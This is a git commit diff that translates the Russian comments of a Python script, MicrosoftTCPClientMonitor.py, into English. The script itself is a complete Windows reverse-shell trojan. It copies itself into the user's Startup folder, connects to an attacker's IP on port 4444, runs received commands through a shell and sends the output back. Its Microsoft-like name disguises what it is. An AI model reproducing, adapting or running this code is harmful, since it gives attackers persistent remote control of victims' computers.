281cde84d0d3f0c7721f17f27e34a4b28f2829b8
Retr0-code <60541996+Retr0-code@users.noreply.github.com>
2020-11-11 20:39:32 +0300

    Update MicrosoftTCPClientMonitor.py

--- MicrosoftTCPClientMonitor.py
+++ MicrosoftTCPClientMonitor.py
@@ -1,49 +1,49 @@
-#Добавление необходимых библеотек
+#adding of libraries
 import os
 import socket
 import getpass
 import subprocess
 
-#Объявление глобальных переменных
+#defining of global variables
 s = socket.socket()
-#Нужно поменять
+#have to change
 host = "192.168.1.75"
-#Можно поменять
+#have to change
 port = 4444
 
-#Перемещение программы в автозагрузку
+#copeing of program to startup folder
 username = str(getpass.getuser())
 os.system(f'copy MicrosoftTCPClientMonitor.exe "C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
 
-#Подключение к удалённому хосту (хосту атакуещего)
+#connecting to remote host (host of attacker)
 s.connect((host, port))
 
-#Функция для получения и отправки данных
+#function for sending and receiving data
 def socket_recive():
     try:
-        #Создание цикла для получения и отправки данных
+        #starting cycle for sending and receiving
         while True:
-            #Создание переменной с полученными данными с количеством байт - 1024 (можно изменить по желанию)
+            #defining variable with received data. You can change maximum size
             data = s.recv(1024)
 
-            #При вводе команды cd без аргументов папка неизменяется
+            #if command cd without arguments folder doesn't change
             if data[:2].decode("utf-8") == "cd":
                 os.chdir(data[3:].decode("utf-8"))
 
-            #При условии что длина строки больше нуля результат команды отправляется на хост атакуещего
+            #If the string length is greater than zero the result of the command is sent to the attacker's host
             if len(data) > 0:
                 cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 
-            #Преобразование из байт в текст
+            #decrypting bytes
             output_bytes = cmd.stdout.read() + cmd.stderr.read()
             output_str = str(output_bytes, "utf-8", errors='ignore')
 
-            #Отправка вывода
+            #sending of output
             s.send(str.encode(output_str + str(os.getcwd()) + "> "))
             print(output_str)
-    #Повтор функции при неудаче
+    #retry if doesn't work
     except:
         socket_recive()
 
-#Запуск функции
+#start of function
 socket_recive()
